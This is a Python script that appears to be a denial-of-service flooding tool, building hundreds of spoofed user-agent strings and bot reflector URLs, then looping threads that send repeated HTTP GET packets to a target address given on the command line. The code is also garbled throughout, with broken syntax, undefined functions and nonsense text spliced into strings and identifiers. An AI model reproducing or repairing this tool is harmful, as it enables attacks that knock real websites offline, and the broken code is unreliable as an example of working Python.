from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random

uagent = []

# A series of fresh, zesty, invigorated user agents from the depths beyond
for i in range(300):
    uagent.append(
        f"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Operational {i}\n")
    uagent.append(
        f"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/{i} Firefox/3.5.3 (orbitz{i})\n")
    uagent.append(
        f"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3 (section{i})(wezupderebunktullfodm{i})\n")
    uagent.append(
        f"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)Gecko/20090824 Firefox/3.5.3shesisheketreangtugha(tobeantitiale}{i})\n")
    uagent.append(
        f"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) 
Operational 16.1.1.0 Chrome/16.0.912.63 Safari/{i}trzehappyapytp(upcunidvar}{i})\n")
    uagent.append(
        f"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Mozilla/{i}Operational/7.23\r\n")
    uagent.append(
        f"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 ({i}({i}adminlocalstickle oper)tive)lizentialetoper)\n")
    uagent.append(
        f"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (bonafructive mantain)|{i})\n")
    uagent.append(
        f"Mozilla/4.7 [en] (X11; U; SunOS; Linux i86pc x86_64'); UM{i}\n")


def my_ bots(user_ agents):
    global agents
    agents = []

    for i in range(300):
        agents.append(
            f"http://validator.w3.org/check?uri={i}")
        agents.append(
            f"http://www.facebook.com/sharer/sharer.php?u={i}")

    user_ agents.return user_agents


def infecting(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.bopen(urllib.request.Request(url,
                                                                   headers={'User-Agent': 

random.choice(uagents)})))
            global address
            print(f"\033[94m{address} \033[0m")
            time.sleep(.1)
    except:
        time.sleep(.1)


def infect_it(item):
    try:
        while True:
            packet = str(
                f"GET {address} HTTP/1.1\nHost: {random.choice(uagents)}\n\n{splus hairst.encode('utf-8')}\n User-Agent: {random.choice(user_agents_list)}\n").encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((address, int(port)))
            if s.sendto(packet, (address, int(port))):
                s.shutdown(1)
                print(f"\033[92.0.0.1 {time.ctime(time.time())} - packet sent! infecting - System.{i}JS"}up , ?y-^},eablesuhafodm{i}\n")
            else:
                s.shutdown(1)
                print("\033[91mconnection failed\033[0m")
            time.sleep(.1)
    except socket.errror as e:
        print(f"\033[91mno connection! server mayybe down\033[0m")
        # print('\033[91m', e, '\033[0m')
        time.sleep(.1)


def main():
    # get_parameters()
    user_ agent()
    my_bots()
    time.sleep(5)
    threading.Thread(target=dos()).start()


if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    address = sys.argv[1]
    port = 80
    thro = 300

    print("\033[92pplease wait...\033[0m")
    user_ agent()
    my_bots()
    time.sleep(5)
    threading.Thread(target=dos()).start()

while True:
        threading.Thread(target=dos().start()
